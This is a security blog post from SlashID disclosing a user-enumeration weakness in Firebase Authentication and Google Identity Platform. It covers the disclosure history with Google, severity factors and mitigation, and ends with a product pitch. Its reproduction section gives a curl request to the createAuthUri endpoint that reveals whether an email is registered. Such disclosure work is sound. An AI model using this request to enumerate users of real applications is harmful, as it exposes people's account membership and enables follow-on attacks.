@@ -1,0 +1,52 @@
+Firebase Authentication and Google Identity Platform User Enumeration Vulnerability | SlashID Blog
+
+
+
+
+ProductsAccessImprove user conversion, go passwordless.GateThe identity-aware edge authorizer.Data VaultServerless-ready secure PII user data storage.Use casesProduct & EngineeringOnboardingAnalytics & ScreeningPlatform & SecurityFraud & SecurityEdge AuthenticationApplication Access PlaneDevelopersBlogGalleryE-commerce PlaygroundBuild a passwordless eCommerce experience backed by SlashID.Multi-tenant AppBuild a multi-tenant app using SlashID.Log inGet startedProductsAccessGateData VaultUse casesOnboardingAnalytics & ScreeningFraud & SecurityEdge AuthenticationApplication Access PlaneDevelopersBlogGalleryE-commerce PlaygroundMulti-tenant AppLog inGet startedSecurityFirebase Authentication and Google Identity Platform User Enumeration VulnerabilityFirebase Authentication and Google Identity Platform are the two Google products that offer identity management.Both products suffer from a vulnerability that allows an attacker to enumerate users on an application powered by Firebase Authentication or Google Identity PlatformIn this article, we’ll show how this vulnerability can be used and what the impact is.Vincenzo Iozzo, Giovanni Gola27 Nov, 2023IntroductionThe detailsSeverityProtecting against the issueConclusionIntroduction
+Firebase Authentication and its enterprise version, Google Identity Platform, are very popular solutions for adding identity to an application.
+During the course of a migration for a customer, we identified an issue in both platforms that can lead to the enumeration of users registered on an application.
+We contacted Google on September 7th 2023 through their vulnerability disclosure program, and we received an answer on October 31st from their Trust and Safety team telling us that
+the issue won’t be fixed, as it is behavior outlined in their privacy policy. In particular, they stated that if an attacker has knowledge of the email address of a user, the intended behavior is for the attacker to be able to see information about that user.
+We disagree with Google’s approach, as this kind of issue reduces user privacy and can lead to several downstream attacks. Further, several CVEs have been assigned to issues like this, and OWASP has a specific test for it in their Web Security Testing Guide, WSTG-IDNT-04.
+The issue is under embargo but can be found here.
+The details
+Firebase Auth and Google Identity Platform have an API endpoint that allows you to check whether a user is registered or not.
+The issue stems from the fact that you can use the API to enumerate accounts on a tenant. The API requires an API key to be used but in practice, the API can be invoked directly from the frontend so anybody can spoof the API key. Furthermore, Google does not enforce CORS, and the documentation does not clearly describe how the endpoint is supposed to be used, so we believe the behavior to be intentional.
+Reproducing this is straightforward:
+
+Visit a website that uses Firebase Authentication or Google Identity Platform
+Find an invokation of accounts:createAuthUri or any other Identity Platform API that requires an API Key
+Invoke the API, as shown below
+
+curl 'https://identitytoolkit.googleapis.com/v1/accounts:createAuthUri?key=<API_KEY>' --compressed -X POST -H 'Content-Type: application/json' -H 'Origin: https://<DOMAIN>' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache' --data-raw '{"continueUri":"<DOMAIN>","identifier":"<EMAIL>"}'
+{
+  "kind": "identitytoolkit#CreateAuthUriResponse",
+  "allProviders": [
+    "password"
+  ],
+  "registered": true,
+  "sessionId": "8fyGaPacaiHJPVVwPu32Alyxs-k",
+  "signinMethods": [
+    "password"
+  ]
+}
+Severity
+From our brief investigation it is not possible to find any other information about the user beyond what we show in the example above. Ultimately, whether this issue warrants attention depends on several factors, including:
+
+What jurisdiction your users fall into and which data protection laws apply
+The kind of application and how sensitive is the knowledge that a given user exists on it (for example, healthcare applications may deem this sensitive)
+
+Protecting against the issue
+As discussed, Google will not fix this behavior, as it is intended according to their Privacy Policy. If you would like to avoid this issue the only recommendation at this time is to avoid using API keys in any frontend calls to Firebase/Google Identity Platform.
+Conclusion
+If you are interested in migrating from Firebase Authentication/Google Identity Platform to SlashID, you can get a free account here
+or reach out to us!Vincenzo Iozzo, Giovanni GolaShareTwitterLinkedinFacebookRelated articlesSecurity+00Phishing Attacks – WebAuthn to the rescueAuthentication token theft is on the rise, with the latest Uber breach demonstrating yet again the threat that it poses.Vincenzo Iozzo·12 Sep, 2022New Feature+00GDPR Compliance: Consent ManagementEffortless GDPR compliance out of the box. Notify users about your intent to use cookies and request their consent.Jake Whelan·27 Oct, 2023New Feature+00OAuth 2.0 Fine-Grained API Authorization with Gate and OpenAPIProtect your API against unauthorized access without changing your application.Joseph Gardner·23 Oct, 2023SlashID/Identity at scaleSecure your users
+•••••••••••••••••
+Secure your users
+
+
+The identity stack for users and APIs built for product teams with
+          deadlines.
+Get started© 2023 SlashID® Inc.All Rights Reserved.Terms · Privacy · System StatusProductsGateAccessData VaultSlashIDBlogCareersTalk to usDevelopersGet startedDocumentationSystem StatusSecurityGalleryE-commerceMulti-tenancySocialTwitterLinkedin
+We use cookies to improve your experience. Read our cookie policy.Accept allReject all
